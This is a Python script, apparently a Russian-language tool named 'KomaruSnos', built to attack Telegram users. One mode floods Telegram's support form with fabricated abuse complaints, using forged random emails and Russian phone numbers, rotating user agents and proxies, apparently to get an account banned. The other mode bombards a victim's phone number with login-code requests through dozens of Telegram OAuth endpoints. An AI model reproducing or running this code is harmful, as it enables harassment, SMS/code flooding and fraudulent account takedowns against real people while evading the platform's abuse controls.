import asyncio
import aiohttp
import random
from datetime import datetime
import socket
import pyfiglet
from termcolor import colored
import random
import string
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import asyncio
import aiohttp
import random
from datetime import datetime
import socket
import pyfiglet
from termcolor import colored

def generate_random_russian_phone_number():
    prefixes = ['952', '912', '902', '916', '977', '961', '932', '988']
    prefix = random.choice(prefixes)
    number = ''.join([str(random.randint(0, 9)) for _ in range(7)])
    return f"+7{prefix}{number}"
 
def generate_random_email():
    domains = ['gmail.com', 'mail.com', 'outlook.com', 'handlers.com']
    username_length = random.randint(5, 10)
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=username_length))
    domain = random.choice(domains)
    return f"{username}@{domain}"

ascii_banner = pyfiglet.figlet_format("KomaruSnos")
colored_banner = colored(ascii_banner, color='cyan')
print(colored_banner)
	
def check_data_files():
    try:
        with open('text.txt', 'r') as text_file:
            text = text_file.read().splitlines()
        with open('ua.txt', 'r') as ua_file:
            ua_list = ua_file.read().splitlines()

        if not text or not ua_list:
            print("Ошибка: Файлы text.txt или ua.txt пусты или отсутствуют данные.")
            return False, None, None
        return True, text, ua_list

    except FileNotFoundError:
        print("Ошибка: Файлы text.txt или ua.txt не найдены.")
        return False, None, None


async def send_complaint(session, text, ua_list, proxy=None):
    global yukino
    headers = {
        'User-Agent': random.choice(ua_list)
    }
    payload = {
        'text': text,
        'email': generate_random_email(),
        'contact': generate_random_russian_phone_number()
    }
    try:
        async with session.post('https://telegram.org/support', data=payload, headers=headers, proxy=proxy) as response:
            if response.status == 200:
                yukino += 1
                print(colored(f"Жалоба успешно отправлена с номера {payload['contact']}\nОтправил с email {payload['email']}\nВсего отправлено {yukino} сообщений", 'cyan'))
            else:
                print(colored(f"Произошла ошибка при отправке жалобы", 'red'))
    except aiohttp.ClientError as e:
        print(colored(f"Ошибка соединения: {e}", 'red'))


async def send_code_request(session, number, url, headers, data):
    global sent_requests
    try:
        async with session.post(url, headers=headers, data=data) as response:
            if response.status == 200:
                sent_requests += 1
                print(colored(f"Запрос кода для номера {number} успешно отправлен!\nВсего отправлено: {sent_requests} запросов", 'red'))
            else:
                print(colored(f"Произошла ошибка при запросе кода для номера {number} на {url}", 'red'))
    except aiohttp.ClientError as e:
        print(colored(f"Ошибка соединения: {e}", 'red'))


async def main(ua_list):
    global yukino, sent_requests
    yukino = 0
    sent_requests = 0
    print(colored(f"   [Created by main53x.t.me aka @corelv]", 'cyan'))

    action = input ("   1. Снос через сайт\n   2. Флуд кодами\nВыберите: ").strip()

    if action == '1':
        device_name = socket.gethostname()


        print(colored(f"Скрипт запущен", 'green'))

        valid_files, text, _ = check_data_files()
        if not valid_files:
            exit()

        use_proxies = input("Использовать прокси? (yes/no): ").strip().lower() == 'yes'
        proxies = []

        if use_proxies:
            with open('proxies.txt', 'r') as proxy_file:
                proxies = proxy_file.read().splitlines()

        while True:
            limit = int(input("Введите лимит: "))
            interval = 60 / 175  

            async with aiohttp.ClientSession() as session:
                tasks = []
                for _ in range(limit):
                    chosen_text = random.choice(text)
                    proxy = random.choice(proxies) if use_proxies else None
                    tasks.append(send_complaint(session, chosen_text, ua_list, proxy))

                    if len(tasks) >= 175:  
                        await asyncio.gather(*tasks)
                        tasks = []
                        await asyncio.sleep(interval) 

                if tasks: 
                    await asyncio.gather(*tasks)
                    await asyncio.sleep(interval) 

            print(colored("Отправка завершена!", 'green'))
            more_complaints = input("Хотите отправить еще жалоб? (yes/no): ").strip().lower()
            if more_complaints != 'yes':
                break
    elif action == '2':
        number = input("Введите номер телефона: ").strip()
        urls = [
        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://translations.telegram.org/auth/request',
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
            'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
            'https://my.telegram.org/auth/send_password'
        ]

        async with aiohttp.ClientSession() as session:
            tasks = []
            for url in urls:
                headers = {'User-Agent': random.choice(ua_list)}
                data = {'phone': number}
                tasks.append(send_code_request(session, number, url, headers, data))

            await asyncio.gather(*tasks)

        print(colored("Запросы на код были отправлены!", 'green'))

if __name__ == "__main__":
    valid_files, _, ua_list = check_data_files()
    if valid_files:
        asyncio.run(main(ua_list))
    else:
        print("Ошибка: Один или оба из файлов text.txt или ua.txt отсутствуют или пусты.")
       
    